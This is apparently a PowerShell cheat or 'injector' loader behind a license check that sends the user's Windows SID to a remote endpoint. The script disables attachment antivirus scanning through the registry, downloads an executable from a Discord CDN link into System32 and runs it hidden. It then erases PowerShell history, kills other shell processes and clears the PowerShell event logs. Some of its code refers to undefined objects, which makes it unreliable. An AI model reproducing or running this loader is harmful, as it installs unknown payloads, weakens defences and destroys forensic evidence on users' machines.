# Force TLS 1.2 (required for Netlify HTTPS)
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12


# Step 1: Get current user's SID
try {
    $user = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $sid = $user.User.Value
} catch {
    Write-Host "[x] Failed to retrieve SID"
    Enable-WindowsEventLog
    exit
}

# Step 2: Call your Netlify API
$apiUrl = "https://orphues2apix.netlify.app/.netlify/functions/checkSid?sid=$sid"

try {
    $response = Invoke-RestMethod -Uri $apiUrl -Method Get
} catch {
    Write-Host "[x] Network Error: $_"
    Enable-WindowsEventLog
    exit
}

# Step 3: Check response
if ($response.success -eq $true) {
    Write-Host "[+] License Verified: $($response.message)"
    
    # Step 4: Injection logic placeholder
    Write-Host "[*] Proceeding with injection..."
    function Flush-DNS {
        try {
            Invoke-Expression "ipconfig /flushdns" -ErrorAction SilentlyContinue | Out-Null
        } catch {
            # Suppress errors to maintain stealth
        }
    }

    Stop-Process -Name "ctfmon" -Force -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 500
    Start-Process "C:\Windows\System32\ctfmon.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 1

    $regCommand1 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v SaveZoneInformation /t REG_DWORD /d 2 /f"
    $regCommand2 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v ScanWithAntiVirus /t REG_DWORD /d 2 /f"

    Invoke-Expression $regCommand1 | Out-Null
    Invoke-Expression $regCommand2 | Out-Null

    Set-ExecutionPolicy Unrestricted -Scope Process -Force | Out-Null

    $ctfmonRunning = Get-Process -Name "ctfmon" -ErrorAction SilentlyContinue
    $discordRunning = Get-Process -Name "discord" -ErrorAction SilentlyContinue
    if ($ctfmonRunning -and $discordRunning) {
        $destination = "C:\Windows\System32\msdriver.exe"
        $url = "https://cdn.discordapp.com/attachments/1368958099712376952/1385752085806715081/msdriver.exe?ex=685735b3&is=6855e433&hm=dc8d27b2586ac7c80f012099b02b49c5a00ba24aa846a42315140b028e1bff17&"
        Invoke-WebRequest -Uri $url -OutFile $destination -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
        Start-Process -FilePath $destination -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
    }
    
    Flush-DNS
    Clear-History
    $historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
    if (Test-Path $historyPath) {
        Remove-Item $historyPath -Force -ErrorAction SilentlyContinue | Out-Null
    }

    $attachmentsRegKeyPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments"
    if (Test-Path $attachmentsRegKeyPath) {
        Remove-Item -Path $attachmentsRegKeyPath -Recurse -Force | Out-Null
    }

    Get-Process -Name "powershell" | Where-Object { $_.Id -ne $PID } | Stop-Process -Force -ErrorAction SilentlyContinue | Out-Null
    Get-Process -Name "conhost" -ErrorAction SilentlyContinue | ForEach-Object {
        if ($_.Parent.Id -ne $PID) {
            Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue | Out-Null
        }
    }

    $historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
    if (-not (Test-Path $historyPath)) {
        New-Item -Path $historyPath -ItemType File -Force | Out-Null
    } else {
        Set-Content -Path $historyPath -Value "" -Force -ErrorAction SilentlyContinue
    }

    wevtutil el | Where-Object { $_ -match "PowerShell" } | ForEach-Object { wevtutil cl "$_" }
if ($hProc -ne [IntPtr]::Zero) {
    [Injector]::CloseHandle($hProc) | Out-Null
}


} else {
    Write-Host "[x] License Check Failed: $($response.message)"
    Write-Host "[*] You can retry or contact support."
}
